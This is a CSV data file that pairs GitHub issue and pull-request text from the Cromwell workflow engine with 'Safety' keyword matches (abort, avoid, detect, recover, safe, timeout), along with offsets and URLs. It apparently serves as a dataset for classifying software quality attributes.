Safety,Created branch [`aen_3811`](https://github.com/broadinstitute/cromwell/compare/aen_3811?expand=1) that concisely illustrates how to detect the problem before it happens; fix TBD,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3811#issuecomment-419132650:132,detect,detect,132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3811#issuecomment-419132650,1,['detect'],['detect']
Safety,"Creates hashes for the following:; - command; - backend name; - output expression; - non-file inputs (as simpletons); - file input paths (according to config). Not included in this PR:; - backend specific hashes (runtime attributes, docker, file contents). Note that if you want anything to actually be written you'll want the following options (to avoid a hashing failure); - `lookup-docker-hash=false`; - `hash-docker-names=false`; - `hash-file-paths=true` -- actually you could leave this false but... then you'd always cache hit regardless of what files you're using!; - `hash-file-contents=false`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1290:349,avoid,avoid,349,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1290,1,['avoid'],['avoid']
Safety,CromIAM support for a Cromwell abort server.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4263:31,abort,abort,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4263,1,['abort'],['abort']
Safety,Cromwell .20 returns 500 on abort,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1253:28,abort,abort,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1253,1,['abort'],['abort']
Safety,"Cromwell 37 errors when the backend submit configuration contains an expression like:; `${""-l h_vmem="" + memory + ""G""}`: ; <details>; <summary> error message </summary>; <pre><code>; cromwell.core.CromwellFatalException: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:47); at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73);",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:582,recover,recoverWith,582,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,1,['recover'],['recoverWith']
Safety,Cromwell 404ing 'abort' on batched workflows,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4497:17,abort,abort,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4497,1,['abort'],['abort']
Safety,Cromwell Didn't Detect Finished Jobs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:16,Detect,Detect,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Detect'],['Detect']
Safety,Cromwell Version: 37 (I just saw the reversion. is it safe to revert from 37 to 36.1?). It looks like the only labels that are added to the PAPI2 VMs are the `cromwell-id` and the `task-name`. None of the custom labels are being added to the VM. If this is one of the issues that was solved in v36.1 Then I will gladly revert so long as it is safe!,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4692:54,safe,safe,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4692,2,['safe'],['safe']
Safety,"Cromwell does not support WDL 1.1 at the moment, although I think there may still be an underlying bug here -- I have seen odd behavior in Cromwell using Structs in WDL 1.0 where the contents of the struct may be undefined. If you want to use WDL 1.1, I recommend [miniwdl](https://github.com/chanzuckerberg/miniwdl) as an alternative to Cromwell. If you need to use Cromwell (eg you need to use Terra), I recommend avoiding any optional types when using structs through some combination of `select_first()` and only interacting with your optional file `if length(some_array_with_optional_in_it) > 0`. You can also use `defined()`, but be aware that `defined(output_of_task_that_did_not_run)` can be true in some cases.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7249#issuecomment-1846184654:416,avoid,avoiding,416,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7249#issuecomment-1846184654,1,['avoid'],['avoiding']
Safety,"Cromwell has REST api to query the workflow status,'RUNNING','Aborted' etc. Does Cromwell has any event system to subscribe these events? With these events, outside apps can monitor the workflow in real time.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6756:62,Abort,Aborted,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6756,1,['Abort'],['Aborted']
Safety,"Cromwell may submit more jobs to the Pipelines API than is able to run at one time, so they're held in a queue by Google Cloud. As jobs finish, the next job is run. There are a few ways to terminate a workflow (see the [Abort guide](https://cromwell.readthedocs.io/en/stable/execution/ExecutionTwists/#abort) for more information). But essentially you need Cromwell to gracefully shut down the workflow:. - In `run` mode, you can issue [SIGINT or SIGTERM](https://cromwell.readthedocs.io/en/stable/Configuring/#abort) which asks Cromwell to issue the abort requests to GCP,; - In `server` mode, you can issue an `abort` through a POST request. By running `scancel`, you may not give Cromwell sufficient time to perform this graceful shutdown process, and hence your jobs held in the GCP Pipelines queue will still execute.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5380#issuecomment-579527898:220,Abort,Abort,220,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5380#issuecomment-579527898,9,"['Abort', 'abort']","['Abort', 'abort']"
Safety,"Cromwell now claims a workflow is aborted when it has confirmation from JES that all jobs have a terminal status. This does not necessarily mean that JES did successfully abort all of them, but that's an issue we should bring up to Google if it happens. I'm not sure what this ticket is suggesting to do so I won't close :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1409#issuecomment-342589399:34,abort,aborted,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1409#issuecomment-342589399,2,['abort'],"['abort', 'aborted']"
Safety,Cromwell throws `java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor` exception when it tries to recover a running job. Stacktrace:; ```; ERROR - AwsBatchAsyncBackendJobExecutionActor [UUID(4057b0c6)generate_10gb_file.generate_file:NA:1]: Error attempting to Recover(StandardAsyncJob(4704e5c9-3a79-4280-a464-d737f36056ec)); java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:628); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:627); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.execute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:653); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recoverAsync(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:949); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecu,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:208,recover,recover,208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,2,"['Recover', 'recover']","['Recover', 'recover']"
Safety,"Cromwell version: 30-9a7de06. Minimized from one of our WDLs:; ```wdl; workflow Test {; Boolean do; Int n. if (do) {; call Optional; }. scatter (i in range(n)) {; call Scattered; }. call Gather {; input:; # HERE: select_first returns String, and Scattered.out is an Array[String]; ins = if defined(Optional.out) then select_first([Optional.out]) else Scattered.out; }; output {; Gather.out; }; }. task Optional {; command {; echo ""Hey!""; }; output {; String out = read_string(stdout()); }; }. task Scattered {; command {; echo ""Hello!""; }; output {; String out = read_string(stdout()); }; }. task Gather {; Array[String] ins. command {; cat ${write_lines(ins)}; }; output {; String out = read_string(stdout()); }; }; ```. This WDL runs successfully, but in code review I noticed the weird type mismatch between the branches. I asked @cjllanwarne about it and he thought it was an old ""feature"" that had been purged to avoid bugs / confusion. I'd expect something like this to be rejected.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3478:918,avoid,avoid,918,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3478,1,['avoid'],['avoid']
Safety,"Cromwell's requester pays logic works by trying to perform GCS operations without specifying a project to bill. If the operation is successful, great, all done. If the operation is not successful and the error message looks like a requester pays error, the operation is retried with the project to bill specified. IIRC this system is in place because always specifying the project to bill resulted in the project being billed even if the bucket was not requester pays. It's unfortunate this logic needs to be so clunky when GCS does have the concept of [provisional user projects](https://developers.google.com/resources/api-libraries/documentation/storage/v1/java/latest/com/google/api/services/storage/Storage.Buckets.GetIamPolicy.html#setProvisionalUserProject-java.lang.String-) but this concept is not supported in the Google Storage API used by the GCS filesystem. Anyway the ""is this requester pays"" logic used to look for exact matches to an error message string, i.e. exactly this:; ```; Bucket is requester pays bucket but no user project provided.; ```; However with increasing probability (the `requester_pays_engine_functions` Centaur test fails about 50% of the time with the baseline Cromwell code) we are seeing error messages that actually look like this:; ```; 400 Bad Request; POST https://storage.googleapis.com/upload/storage/v1/b/cromwell_bucket_with_requester_pays/o?projection=full&uploadType=multipart; {; ""error"": {; ""code"": 400,; ""message"": ""Bucket is requester pays bucket but no user project provided."",; ""errors"": [; {; ""message"": ""Bucket is requester pays bucket but no user project provided."",; ""domain"": ""global"",; ""reason"": ""required""; }; ]; }; }; ```. The changes here accommodate either version of the error message with a `null`-safe `contains` check courtesy Apache StringUtils.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6556:1766,safe,safe,1766,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6556,1,['safe'],['safe']
Safety,"Current known issues (feel free to add/remove/edit):; - [ ] Today the existing BatchCompute cluster consists of 1 pre-allocated machine slowing down parallel CI tests (run `bcs c` to see the current size). `OnDemand` clusters are available but take time to spin up the VM instance even [without docker](https://github.com/broadinstitute/cromwell/issues/3518).; - [ ] Like all integration tests there may be intermittent failures/timeouts connecting to external resources. While retry support could be copied out of the PAPI backends and into each backend, once [retries are available across all backends](https://github.com/broadinstitute/cromwell/issues/3161) the CI should be setup to retry failures.; - [ ] The BCS backend is leaking _some_ finished and failed jobs, hitting the job quota after a day or two. It's possible a [nightly cron job](https://github.com/broadinstitute/cromwell/issues/3555) could clean out the leaked jobs but for users this issue should really be fixed elsewhere.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3554:429,timeout,timeouts,429,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3554,1,['timeout'],['timeouts']
Safety,"Current proposal is to support the [`disks` runtime attribute](http://cromwell.readthedocs.io/en/develop/RuntimeAttributes/#disks) using the following rules:. 1. For all tasks, provide a predictable bind mount for `local-disk`. Specifications for disk size and disk type will be ignored, as they are not needed or configurable at runtime for AWS Batch. ; 2. Other mount points that are defined (e.g. `disks: ""/mnt/my_mnt 3 SSD, /mnt/my_mnt2 500 HDD""`) will result in additional bind mounts from the host container to the running docker container for the task. The disk size and disk type are ignored. The AWS Batch reference deployment for Cromwell will provide a mount point for each task which the `disks` will be structured under. As an example, assume the following runtime attribute definition:. ```; runtime {; disks: ""local-disk 100 SSD, /mnt/my_mnt 3 SSD, /mnt/my_mnt2 500 HDD""; }; ```. Will result in a filesystem tree structure on the host:. ```; /mnt/cromwell_io_mountpoint/; ├── $CROMWELL_TASK_ID; ├── /cromwell_root; └── /mnt/; ├── /my_mnt; └── /my_mnt2; ```. And the running container will see the `/cromwell_root`, `/mnt/my_mnt` and `/mnt/my_mnt2` directories.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3744#issuecomment-398854923:187,predict,predictable,187,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3744#issuecomment-398854923,1,['predict'],['predictable']
Safety,"Currently WorkflowActor aborts BJEAs directly. A whole bunch of much nicerness would occur if it aborted the EJEA and let that ripple down the abort to the BJEA (or something else, depending on its FSM state)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1504:24,abort,aborts,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1504,3,['abort'],"['abort', 'aborted', 'aborts']"
Safety,"Currently the cromwell.conf file specifies the ARN of the queue that jobs; are submitted to. You can either change this to a new queue or you can; change the queue to use (or prioritize) a compute environment that uses on; demand instances. On Thu, Nov 19, 2020 at 2:32 PM Richard Davison <notifications@github.com>; wrote:. > If it works the same approach would allow for recovery in the case of Spot; > interruption; >; > By the way, speaking of this, how would I submit a job to an on-demand; > compute environment manually? It seems whenever I submit a workflow to; > cromwell, it always runs in a spot instance.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPPHWFJT3BFIOU2TCLSQVXFVANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345:373,recover,recovery,373,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345,1,['recover'],['recovery']
Safety,"Currently when Cromwell starts it updates all `Running` workflows to `RestartableRunning` and `Aborting` to `RestartableAborting` so that it knows which workflows were already running and need to be restarted.; If multiple Cromwells are started against the same DB, they can't all keep changing all workflow statuses as they start.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3347:95,Abort,Aborting,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3347,1,['Abort'],['Aborting']
Safety,"Currently when a user issues a request to abort a workflow, the process is purely in-memory. This means that there's no way to manually trigger an abort other than the web endpoint. Instead, do something similar to the workflow store. Record the request in a table, and have cromwell monitor that table looking for workflows it is running, and when it sees such a thing use that to trigger the abort. . It is **not** a bad state if there's a workflow in the table which Cromwell doesn't know about. Make sure any updates to this table are [locked](https://github.com/broadinstitute/cromwell/issues/3342)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3344:42,abort,abort,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3344,3,['abort'],['abort']
Safety,"Currently, there is no library function to flatten an array of array of files (`Array[Array[File]]`). A scatter, where each task call produces an array of files, is a natural way of ending up with such a structure. In order to flatten this array, you can write a task that takes the it as an argument, and manipulate it with python code. However, this task will also download all the files, taking significant time and disk space. To work around this, you can coerce the files into strings (their paths), and manipulate the paths. . You can see an example [here](https://github.com/HumanCellAtlas/skylab/blob/master/10x/count/count.wdl#L195). The `chunk_reads_join` task flattens the `fastq_chunks` file array, which is coerced into an `Array[Array[String]]`. In order to avoid this circuitous implementation, this pull requests implements a generic flatten operation for ragged array types.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2825:772,avoid,avoid,772,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2825,1,['avoid'],['avoid']
Safety,"Currently, to process a glob on JES, Cromwell does an `ls` of the google cloud storage location. The problem with this is that ls is eventually consistent, which leads to bugs like #843 . JES has added a feature (#28858407) where they now return the number of files that matched the glob as part of their metadata. These appear as events of the form. `{Description: ""copied 3 file(s) to \""gs://my-bucket/out/\"""",; StartTime: {Seconds: 1470063955,; Nanos: 748725437}},`. In Cromwell, when processing these globs, we should poll (with adjustable maximum timeout) for this number of files to appear via the ls. If they do not appear after the timeout, the task should fail with an appropriate error message. If we are processing globs on GCS and NOT using JES, the best we can do is just grab and go via the ls (as we are doing currently for JES).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1395:552,timeout,timeout,552,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1395,2,['timeout'],['timeout']
Safety,"Currently, we are storing a relatively not-so-useful state data in the WMA. It is only used in case of abort to get the WA corresponding to the abortable workflow ID. The current scheme of things can be replaced by a relatively simple actor selection method for abort, which may have varied opinions amongst developers but I believe it provides a more bang for buck.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/606:103,abort,abort,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/606,3,['abort'],"['abort', 'abortable']"
Safety,Cut out KV Store in JES abort to sidestep a race condition. Closes #1253,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1410:24,abort,abort,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1410,1,['abort'],['abort']
Safety,DSDEEPB-852 Provide web endpoint to abort a workflow.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/114:36,abort,abort,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/114,1,['abort'],['abort']
Safety,Data migration for restart/recover,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1119:27,recover,recover,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1119,1,['recover'],['recover']
Safety,Database-driven abort.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4401:16,abort,abort,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4401,1,['abort'],['abort']
Safety,"Dear developers,. During testing I ran into the problem that the `HashPathStrategy` does not include the last modified date of the file. It assumes: ""if the path is there, it is the same file"". This is not necessarily the case. Files can be modified or replaced.Therefore the current `HashPathStrategy` is a big liability when trying to get reproducible results. By adding a ""last modified date"" to the `HashPathStrategy` this will ensure that nothing has happened to the file from the user or system side. This of course is not as safe as the `HashFileStrategy` since it does not protect against filesystem or hardware errors, but it provides a lot more safety compared to the current `HashPathStrategy`. ; This is also how Snakemake checks if files are the same and it works quite well. Alternatively there could be an option in the Configfile that allows you to set this behaviour. Please let me know what you think of this.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4405:532,safe,safe,532,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4405,2,['safe'],"['safe', 'safety']"
Safety,Default the SWRA to abortJobsOnTerminate = true.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1664:20,abort,abortJobsOnTerminate,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1664,1,['abort'],['abortJobsOnTerminate']
Safety,Delete zipped imports in the end of test to avoid `NoSuchFileException` on retries [BA-6136],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5319:44,avoid,avoid,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5319,1,['avoid'],['avoid']
Safety,"Description:; * Adds a statistics recorder into the WriteMetadataActor to count rows being sent per workflow. If the counter goes about a given limit, we get an alert back which the write actor converts into a log message. . Food for reviewers' thoughts:. * Does the set of configuration options make sense?; * And what might be sensible default values?; * I'm not a huge fan of how subworkflows' parents are detected here. Is there a more direct way to find out a parent?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6641:409,detect,detected,409,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6641,1,['detect'],['detected']
Safety,Detect error 500 in JES backend and retry job,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1450:0,Detect,Detect,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1450,1,['Detect'],['Detect']
Safety,Detect incorrect Docker Machine usage,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/362:0,Detect,Detect,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/362,1,['Detect'],['Detect']
Safety,Detect stalled workflows,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4486:0,Detect,Detect,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4486,1,['Detect'],['Detect']
Safety,Didn't @aednichols increase the timeout for that very recently ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-417771115:32,timeout,timeout,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-417771115,1,['timeout'],['timeout']
Safety,Do not become catatonic on abort.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1382:27,abort,abort,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1382,1,['abort'],['abort']
Safety,Docs HPCSlurmWithLocalScratch.md redundant?,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7357:33,redund,redundant,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7357,1,['redund'],['redundant']
Safety,Document a general-purpose recovery process,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4991:27,recover,recovery,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4991,1,['recover'],['recovery']
Safety,"Doesn't close #751 but stabs in its general direction. There is no persistent DB here, I replaced the DB-based approach in `KeyValueServiceActor` with a simple `Map` since the DB-based approach always failed to write due to referential integrity constraints that aren't going to be fixed (no `EXECUTION` or `WORKFLOW_EXECUTION` data for FK constraints). Ruchi and/or I will have a follow-on PR to put a DB table behind this. Also fixed ""abort"" to message the KV service instead of metadata service, removed now-unused `EXECUTION_INFO`-related methods, other assorted cleanup.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1197:437,abort,abort,437,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1197,1,['abort'],['abort']
Safety,Don't abort prematurely on workflow restart,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2820:6,abort,abort,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2820,1,['abort'],['abort']
Safety,"Don't flog me yet, I will clean this up. There's about a week of cruft from trying various things in here... _Diagram Disclaimer: the below diagrams are now obsolete!_. FAQ:. Q: Why did you change stuff unrelated to aborts?; A: Probably because I had a hard time debugging and it facilitated debugging.; A: Bug fixes; A: Probably no good reason, and it might just be cruft changes. This is how workflow aborts work for the LOCAL backend!. ![workflow aborts local - new page](https://cloud.githubusercontent.com/assets/58551/15552622/4698923c-2289-11e6-9435-3860675d4bf0.png). This is how workflow aborts work for the JES backend!. ![workflow aborts jes - new page](https://cloud.githubusercontent.com/assets/58551/15552644/620972d4-2289-11e6-900f-d2998ebe5544.png). :-D",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/893:216,abort,aborts,216,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/893,5,['abort'],['aborts']
Safety,"Don't know the ticket for aborts - but yes we can confirm individual submissions/workflows, however it's tedious process and you need an admin to do it. Almost every time I've checked it's just a matter of statuses being incorrect and not that the machine is still running",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-335551347:26,abort,aborts,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-335551347,1,['abort'],['aborts']
Safety,"During CromIAM Perf testing, strange behavior occurred where when querying metadata for a workflow right after aborting it yielded a non empty value in the `failures` field, which later disappeared.; Below is an example metadata with the failure:. ```; {; ""calls"": {; ""wf_hello.hello"": [; {; ""preemptible"": false,; ""retryableFailure"": false,; ""executionStatus"": ""Failed"",; ""stdout"": ""gs://fc-391d77ef-2e8c-45e5-bfef-3d12554920ca/wf_hello/9cc9b141-b2fb-4277-94bd-80ad87a49663/call-hello/hello-stdout.log"",; ""commandLine"": ""sleep 60 \necho \""Hello World! Welcome to Cromwell . . . on Google Cloud!\"""",; ""shardIndex"": -1,; ""jes"": {; ""executionBucket"": ""gs://fc-391d77ef-2e8c-45e5-bfef-3d12554920ca"",; ""endpointUrl"": ""https://genomics.googleapis.com/"",; ""googleProject"": ""broad-dsde-alpha""; },; ""runtimeAttributes"": {; ""preemptible"": ""0"",; ""failOnStderr"": ""false"",; ""bootDiskSizeGb"": ""10"",; ""disks"": ""local-disk 10 SSD"",; ""continueOnReturnCode"": ""0"",; ""docker"": ""ubuntu:latest"",; ""maxRetries"": ""0"",; ""cpu"": ""1"",; ""cpuMin"": ""1"",; ""noAddress"": ""false"",; ""zones"": ""us-central1-b"",; ""memoryMin"": ""2.048 GB"",; ""memory"": ""2.048 GB""; },; ""callCaching"": {; ""allowResultReuse"": false,; ""effectiveCallCachingMode"": ""CallCachingOff""; },; ""inputs"": {; ""addressee"": ""World""; },; ""backendLabels"": {; ""cromwell-workflow-id"": ""cromwell-9cc9b141-b2fb-4277-94bd-80ad87a49663"",; ""wdl-task-name"": ""hello""; },; ""labels"": {; ""wdl-task-name"": ""hello"",; ""cromwell-workflow-id"": ""cromwell-9cc9b141-b2fb-4277-94bd-80ad87a49663""; },; ""failures"": [; {; ""causedBy"": [; {; ""causedBy"": [],; ""message"": ""Unexpected execution handle: AbortedExecutionHandle""; }; ],; ""message"": ""java.lang.IllegalArgumentException: Unexpected execution handle: AbortedExecutionHandle""; }; ],; ""backend"": ""JES"",; ""end"": ""2018-12-11T16:07:04.207Z"",; ""stderr"": ""gs://fc-391d77ef-2e8c-45e5-bfef-3d12554920ca/wf_hello/9cc9b141-b2fb-4277-94bd-80ad87a49663/call-hello/hello-stderr.log"",; ""callRoot"": ""gs://fc-391d77ef-2e8c-45e5-bfef-3d12554920ca/wf_hello/9cc9b141",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4484:111,abort,aborting,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4484,1,['abort'],['aborting']
